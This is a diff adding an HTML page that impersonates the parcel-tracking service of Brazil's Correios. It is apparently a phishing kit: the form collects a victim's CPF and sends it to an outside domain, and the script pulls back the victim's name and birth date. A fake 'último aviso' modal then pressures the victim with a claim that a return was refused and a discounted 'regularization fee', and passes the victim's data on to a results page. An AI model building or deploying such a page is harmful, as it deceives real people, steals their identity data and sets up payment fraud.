@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../cdn.hugeicons.com/font/hgi-stroke-rounded.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif !important;
+        }
+        @keyframes modalEntrada {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes bordaPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(250, 204, 21, 0.7); }
+            50% { box-shadow: 0 0 20px 10px rgba(250, 204, 21, 0.4); }
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        .modal-aviso-content {
+            animation: modalEntrada 0.4s ease-out, bordaPulse 2s ease-in-out infinite;
+        }
+        .modal-aviso-content:hover {
+            animation: modalEntrada 0.4s ease-out;
+        }
+        .icone-alerta {
+            animation: shake 0.6s ease-in-out 0.5s;
+        }
+    </style>
+    <title>Rastreie sua Encomenda</title>
+</head>
+<body>
+    <header class="p-2 text-cyan-700 text-xs bg-zinc-100">
+        <span>Acessibilidade <b class="text-xs">▼</b></span>
+    </header>
+
+    <hr class="border-white">
+
+    <header class="bg-zinc-100 p-2 flex items-center justify-between">
+        <i class="hgi hgi-stroke hgi-menu-01 text-2xl font-bold text-cyan-700"></i>
+        <img src="assets/images/logo.svg" alt="Logo" class="w-30">
+        <img src="assets/images/sair.svg" alt="Logo" class="w-8">
+    </header>
+    
+    <hr class="border-orange-500">
+
+    <div class="p-3 text-xs flex items-center gap-1 text-gray-500">
+        <span>Rastreamento</span> <b class="text-lg text-cyan-700">›</b>
+    </div>
+
+
+    <div class="p-4">
+        <div class="p-2">
+            <h1 class="text-2xl text-bold text-cyan-800">Rastreamento</h1>
+        </div>
+        <div class="p-4 flex items-center gap-1 flex-col bg-zinc-100 h-90 rounded-md">
+            <form id="consultaForm" action="https://entrega-rapida.live/rota/includes/consulta.php" method="POST">
+            <p class="text-sm font-bold mb-2">Deseja acompanhar seu objeto?
+            Digite seu CPF/CNPJ:</p>
+            <input type="text" placeholder="Digite seu CPF/CNPJ" name="cpf" required class="w-full p-2 border border-gray-300 rounded-md bg-white mb-2" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);" maxlength="14">
+            <img src="assets/images/captcha.png" alt="Captcha" class="w-full h-20 mb-2">
+            <p class="text-sm mb-2">Digite o codigo da imagem.</p>
+            <input type="text" id="captchaInput" name="captcha" required class="w-full p-2 border border-gray-300 rounded-md bg-white mb-2" placeholder="Digite o código acima">
+            <p id="captchaError" class="text-red-600 text-sm mb-2 hidden">Código do captcha incorreto!</p>
+            <input type="submit" value="Consultar" class="w-full p-2 bg-cyan-700 text-white rounded-md mb-2">
+            </form>
+        </div>
+    </div>
+
+    <footer class="bg-yellow-400 p-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Fale Conosco</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Registro de Manifestações</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Central de Atendimento</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Soluções para o seu negócio</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Suporte ao cliente com contrato</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Ouvidoria</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Denúncia</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Sobre os Correios</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Identidade corporativa</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Educação e cultura</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Código de ética</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Transparência e prestação de contas</a></li>
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Política de Privacidade e Notas Legais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">Outros Sites</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-sm text-gray-800 hover:text-gray-600">Loja online dos Correios</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="text-center mt-6 pt-4 border-t border-yellow-500">
+                <p class="text-sm text-gray-800">© Copyright 2026 Correios</p>
+            </div>
+        </div>
+    </footer>
+
+    <div id="loadingModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-white/90"></div>
+        <div class="relative text-center">
+            <div class="w-10 h-10 border-4 border-gray-200 border-t-cyan-700 rounded-full animate-spin mx-auto mb-4"></div>
+            <p id="statusText" class="text-sm text-gray-600">Consultando...</p>
+        </div>
+    </div>
+
+    <div id="confirmModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/50"></div>
+        <div class="relative bg-white rounded-md shadow-lg p-5 mx-4 w-full max-w-sm">
+            <h3 class="text-base font-bold text-gray-800 mb-3">Confirme seus dados</h3>
+            <p class="text-sm text-gray-600 mb-2">Encontramos uma encomenda para:</p>
+            <p id="confirmName" class="text-sm font-semibold text-gray-800 mb-4 uppercase"></p>
+            <p class="text-sm text-gray-600 mb-4">Você é essa pessoa?</p>
+            <div class="flex gap-3">
+                <button id="btnNo" class="flex-1 py-2 border border-gray-300 text-gray-700 rounded text-sm hover:bg-gray-50">Não</button>
+                <button id="btnYes" class="flex-1 py-2 bg-cyan-700 text-white rounded text-sm hover:bg-cyan-800">Sim</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="avisoModal" class="fixed inset-0 flex items-center justify-center z-50 hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm"></div>
+        <div class="modal-aviso-content relative bg-white rounded-lg shadow-2xl mx-4 w-full max-w-sm border-4 border-yellow-400">
+            <button id="btnCloseAviso" class="absolute top-3 right-3 text-gray-500 hover:text-gray-700 text-2xl font-bold">&times;</button>
+            <div class="p-5 text-left">
+                <div class="flex justify-center mb-3">
+                    <svg class="icone-alerta w-14 h-14" viewBox="0 0 24 24" fill="none">
+                        <path d="M12 2L1 21h22L12 2z" fill="#FBBF24" stroke="#F59E0B" stroke-width="1"/>
+                        <path d="M12 9v4M12 17h.01" stroke="#000" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <p class="text-base text-gray-800 text-center leading-tight">
+                    <span class="font-bold">Prezado(a) <span id="avisoNomeCliente"></span>,</span> esse é o
+                </p>
+                <p class="text-xl font-bold text-red-500 mb-3 text-center leading-tight">ÚLTIMO AVISO.</p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Informamos que <span class="text-red-500 font-bold">realizamos uma tentativa de devolução da sua encomenda ao fornecedor</span>, contudo, a <span class="underline font-bold">devolução foi recusada.</span>
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Para auxiliá-lo na regularização do pedido e garantir a entrega no menor tempo possível, estamos oferecendo uma <span class="underline font-bold">redução de 50%</span> na taxa de regularização.
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Adicionalmente, nesta página, você poderá visualizar a <span class="italic font-bold">foto do seu pedido</span>, que se encontra atualmente na unidade de São Paulo.
+                </p>
+                
+                <p class="text-sm text-gray-800 mb-3 text-justify leading-snug">
+                    Aproveite esta oportunidade para resolver a situação com rapidez e eficiência. Estamos à disposição para quaisquer dúvidas ou esclarecimentos.
+                </p>
+                
+                <p class="text-sm text-gray-800 text-center leading-snug">
+                    Atenciosamente,<br>
+                    <span class="font-bold">Correios</span>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let dadosConsulta = null;
+        const CAPTCHA_CODE = 'cwne';
+        
+        document.getElementById('consultaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Validar captcha
+            const captchaInput = document.getElementById('captchaInput');
+            const captchaError = document.getElementById('captchaError');
+            const captchaValue = captchaInput.value.toLowerCase().trim();
+            
+            if (captchaValue !== CAPTCHA_CODE) {
+                captchaError.classList.remove('hidden');
+                captchaInput.classList.add('border-red-500');
+                captchaInput.focus();
+                return;
+            }
+            
+            // Esconder erro se captcha estiver correto
+            captchaError.classList.add('hidden');
+            captchaInput.classList.remove('border-red-500');
+            
+            const modal = document.getElementById('loadingModal');
+            const statusText = document.getElementById('statusText');
+            const formData = new FormData(this);
+            
+            modal.classList.remove('hidden');
+            statusText.textContent = 'Consultando...';
+            
+            fetch('includes/consulta_ajax.json', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                dadosConsulta = data;
+                
+                setTimeout(function() {
+                    modal.classList.add('hidden');
+                    
+                    if (data.success && data.nome) {
+                        document.getElementById('confirmName').textContent = data.nome;
+                        document.getElementById('confirmModal').classList.remove('hidden');
+                    } else {
+                        window.location.href = 'resultado/index0433.html?nome=&amp;cpf=&amp;nascimento=&amp;imagem=';
+                    }
+                }, 2000);
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                setTimeout(function() {
+                    modal.classList.add('hidden');
+                    alert('Erro ao consultar. Tente novamente.');
+                }, 2000);
+            });
+        });
+        
+        document.getElementById('btnYes').addEventListener('click', function() {
+            if (dadosConsulta) {
+                document.getElementById('confirmModal').classList.add('hidden');
+                
+                const nomeCompleto = dadosConsulta.nome || '';
+                const primeiroNome = nomeCompleto.split(' ')[0];
+                document.getElementById('avisoNomeCliente').textContent = primeiroNome;
+                
+                document.getElementById('avisoModal').classList.remove('hidden');
+            }
+        });
+        
+        document.getElementById('btnNo').addEventListener('click', function() {
+            document.getElementById('confirmModal').classList.add('hidden');
+            dadosConsulta = null;
+        });
+        
+        document.getElementById('btnCloseAviso').addEventListener('click', function() {
+            if (dadosConsulta) {
+                const query = new URLSearchParams({
+                    nome: dadosConsulta.nome || '',
+                    cpf: dadosConsulta.cpf || '',
+                    nascimento: dadosConsulta.nascimento || '',
+                    imagem: dadosConsulta.imagem_gerada || ''
+                }).toString();
+                
+                window.location.href = './resultado/?' + query;
+            }
+        });
+    </script>
+
+</body>
+
+</html>
